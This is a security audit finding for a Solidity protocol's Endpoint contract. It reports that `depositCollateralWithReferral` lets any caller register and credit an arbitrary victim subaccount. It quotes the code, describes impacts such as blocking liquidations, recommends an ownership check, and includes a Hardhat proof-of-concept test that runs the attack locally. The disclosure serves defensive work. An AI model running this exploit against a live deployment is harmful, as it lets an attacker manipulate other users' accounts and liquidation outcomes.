### Title
Missing Caller-Ownership Check in `depositCollateralWithReferral` Allows Unauthorized Subaccount Registration and State Mutation — (`core/contracts/Endpoint.sol`)

---

### Summary

`Endpoint.depositCollateralWithReferral` is `public` and accepts a caller-supplied `subaccount` bytes32 with no check that `address(bytes20(subaccount)) == msg.sender`. Any unprivileged EOA can submit a `DepositCollateral` slow-mode transaction attributed to an arbitrary victim subaccount, causing that subaccount to be registered in `subaccountIds` and credited with collateral — all without the victim's knowledge or consent.

---

### Finding Description

`depositCollateral` (the non-referral entry point) enforces ownership by constructing the subaccount directly from `msg.sender`:

```solidity
// Endpoint.sol:108-110
bytes32 subaccount = bytes32(
    abi.encodePacked(msg.sender, subaccountName)
);
``` [1](#0-0) 

`depositCollateralWithReferral`, however, is `public` and accepts an arbitrary caller-supplied `subaccount`. The only guard is an isolated-subaccount check:

```solidity
// Endpoint.sol:128-129
) public {
    require(!RiskHelper.isIsolatedSubaccount(subaccount), ERR_UNAUTHORIZED);
``` [2](#0-1) 

There is no `require(address(bytes20(subaccount)) == msg.sender)`. Tokens are pulled from `msg.sender` (the attacker), not the victim:

```solidity
// Endpoint.sol:144-148
handleDepositTransfer(
    IERC20Base(spotEngine.getToken(productId)),
    msg.sender,          // attacker pays
    uint256(amount)
);
``` [3](#0-2) 

The resulting slow-mode transaction is queued with `sender` set to `address(bytes20(subaccount))` (the victim's address) and `DepositCollateral.sender` set to the victim's full subaccount bytes32:

```solidity
// Endpoint.sol:152-165
slowModeTxs[_slowModeConfig.txCount++] = SlowModeTx({
    executableAt: uint64(block.timestamp) + SLOW_MODE_TX_DELAY,
    sender: sender,          // victim's address
    tx: abi.encodePacked(
        uint8(TransactionType.DepositCollateral),
        abi.encode(DepositCollateral({
            sender: subaccount, // victim's subaccount
            ...
        }))
    )
});
``` [4](#0-3) 

When the slow-mode transaction is executed, `processSlowModeTransactionImpl` calls `_recordSubaccount(txn.sender)` followed by `clearinghouse.depositCollateral(txn)`:

```solidity
// EndpointTx.sol:214-216
validateSender(txn.sender, sender);
_recordSubaccount(txn.sender);
clearinghouse.depositCollateral(txn);
``` [5](#0-4) 

`_recordSubaccount` writes `subaccountIds[subaccount] = ++numSubaccounts` unconditionally if the entry is zero:

```solidity
// EndpointStorage.sol:67-72
function _recordSubaccount(bytes32 subaccount) internal {
    if (subaccountIds[subaccount] == 0) {
        subaccountIds[subaccount] = ++numSubaccounts;
        subaccounts[numSubaccounts] = subaccount;
    }
}
``` [6](#0-5) 

`validateSender` passes because `address(bytes20(txn.sender))` equals the `sender` field that was stored when the attacker queued the transaction (both derived from the same victim subaccount bytes32). The deposit then proceeds through `Clearinghouse.depositCollateral` → `spotEngine.updateBalance`, mutating the victim's spot balance. [7](#0-6) 

---

### Impact Explanation

The concrete state mutations are:

1. **Unauthorized subaccount registration**: `subaccountIds[victimSubaccount]` is set to a non-zero value without the victim ever interacting with the protocol. This satisfies `requireSubaccount` checks, enabling downstream protocol actions gated on subaccount existence.
2. **Unauthorized balance mutation**: `spotEngine` balance for the victim's subaccount increases, altering their health score without consent.
3. **Liquidation interference**: An attacker (e.g., a competing liquidator) can deposit collateral into a victim subaccount that is approaching the liquidation threshold, pushing its health above the liquidation boundary and blocking a legitimate liquidation.
4. **Forced token exposure**: The attacker can deposit any supported token into the victim's subaccount, changing the victim's risk profile with tokens they did not choose to hold.

The minimum first-deposit threshold (`MIN_FIRST_DEPOSIT_AMOUNT = 5 * ONE`, i.e. $5) is a low cost-of-attack barrier. [8](#0-7) 

---

### Likelihood Explanation

The function is `public`, requires no special role, and the only guard (`isIsolatedSubaccount`) is trivially bypassed by using a standard subaccount bytes32. The attacker only needs to hold $5 worth of a supported token and approve the Endpoint. The 3-day slow-mode delay does not prevent the attack; it only delays execution. [9](#0-8) 

---

### Recommendation

Add an ownership check at the top of `depositCollateralWithReferral`, mirroring the pattern already used in `depositCollateral`:

```solidity
require(
    address(bytes20(subaccount)) == msg.sender,
    ERR_UNAUTHORIZED
);
```

This single line closes the gap between the two entry points. [10](#0-9) 

---

### Proof of Concept

```solidity
// Hardhat test (chainId 31337 — silent-revert mode disabled)
it("attacker registers victim subaccount without consent", async () => {
    const [attacker, victim] = await ethers.getSigners();
    const victimSubaccount = ethers.utils.hexZeroPad(
        ethers.utils.hexlify(victim.address) + "000000000000000000000000",
        32
    ); // bytes32(abi.encodePacked(victimAddress, bytes12(0)))

    // Attacker approves Endpoint for MIN_FIRST_DEPOSIT_AMOUNT ($5)
    await quoteToken.connect(attacker).approve(endpoint.address, FIVE_DOLLARS);

    // Assert victim subaccount is unregistered
    expect(await endpoint.getSubaccountId(victimSubaccount)).to.equal(0);

    // Attacker calls depositCollateralWithReferral with victim's subaccount
    await endpoint.connect(attacker).depositCollateralWithReferral(
        victimSubaccount,
        QUOTE_PRODUCT_ID,
        FIVE_DOLLARS,
        "-1"
    );

    // Fast-forward 3 days and execute slow-mode tx
    await ethers.provider.send("evm_increaseTime", [3 * 24 * 3600]);
    await endpoint.executeSlowModeTransaction();

    // Victim's subaccount is now registered without their consent
    expect(await endpoint.getSubaccountId(victimSubaccount)).to.not.equal(0);
    // Victim's spot balance increased
    const balance = await spotEngine.getBalance(QUOTE_PRODUCT_ID, victimSubaccount);
    expect(balance).to.be.gt(0);
});
``` [11](#0-10)

### Citations

**File:** core/contracts/Endpoint.sol (L108-110)
```text
        bytes32 subaccount = bytes32(
            abi.encodePacked(msg.sender, subaccountName)
        );
```

**File:** core/contracts/Endpoint.sol (L123-167)
```text
    function depositCollateralWithReferral(
        bytes32 subaccount,
        uint32 productId,
        uint128 amount,
        string memory
    ) public {
        require(!RiskHelper.isIsolatedSubaccount(subaccount), ERR_UNAUTHORIZED);

        address sender = address(bytes20(subaccount));

        // depositor / depositee need to be unsanctioned
        requireUnsanctioned(msg.sender);
        requireUnsanctioned(sender);

        if (!isValidDepositAmount(subaccount, productId, amount)) {
            // we cannot revert here, otherwise direct deposit could be blocked when there are
            // multiple assets awaiting credit but one of them is below the minimum deposit amount.
            // we can just skip the deposit and continue with the next asset.
            return;
        }

        handleDepositTransfer(
            IERC20Base(spotEngine.getToken(productId)),
            msg.sender,
            uint256(amount)
        );
        // copy from submitSlowModeTransaction
        SlowModeConfig memory _slowModeConfig = slowModeConfig;

        slowModeTxs[_slowModeConfig.txCount++] = SlowModeTx({
            executableAt: uint64(block.timestamp) + SLOW_MODE_TX_DELAY, // hardcoded to three days
            sender: sender,
            tx: abi.encodePacked(
                uint8(TransactionType.DepositCollateral),
                abi.encode(
                    DepositCollateral({
                        sender: subaccount,
                        productId: productId,
                        amount: amount
                    })
                )
            )
        });
        slowModeConfig = _slowModeConfig;
    }
```

**File:** core/contracts/EndpointTx.sol (L214-216)
```text
            validateSender(txn.sender, sender);
            _recordSubaccount(txn.sender);
            clearinghouse.depositCollateral(txn);
```

**File:** core/contracts/EndpointStorage.sol (L67-72)
```text
    function _recordSubaccount(bytes32 subaccount) internal {
        if (subaccountIds[subaccount] == 0) {
            subaccountIds[subaccount] = ++numSubaccounts;
            subaccounts[numSubaccounts] = subaccount;
        }
    }
```

**File:** core/contracts/Clearinghouse.sol (L193-209)
```text
    function depositCollateral(IEndpoint.DepositCollateral calldata txn)
        external
        virtual
        onlyEndpoint
    {
        require(!RiskHelper.isIsolatedSubaccount(txn.sender), ERR_UNAUTHORIZED);
        require(txn.amount <= INT128_MAX, ERR_CONVERSION_OVERFLOW);
        ISpotEngine spotEngine = _spotEngine();
        uint8 decimals = _decimals(txn.productId);

        require(decimals <= MAX_DECIMALS);
        int256 multiplier = int256(10**(MAX_DECIMALS - decimals));
        int128 amountRealized = int128(txn.amount) * int128(multiplier);

        spotEngine.updateBalance(txn.productId, txn.sender, amountRealized);
        emit ModifyCollateral(amountRealized, txn.sender, txn.productId);
    }
```

**File:** core/contracts/common/Constants.sol (L40-42)
```text
int256 constant MIN_DEPOSIT_AMOUNT = ONE / 10; // $0.1

int256 constant MIN_FIRST_DEPOSIT_AMOUNT = 5 * ONE; // $5
```

**File:** core/contracts/common/Constants.sol (L50-50)
```text
uint64 constant SLOW_MODE_TX_DELAY = 3 * 24 * 60 * 60; // 3 days
```
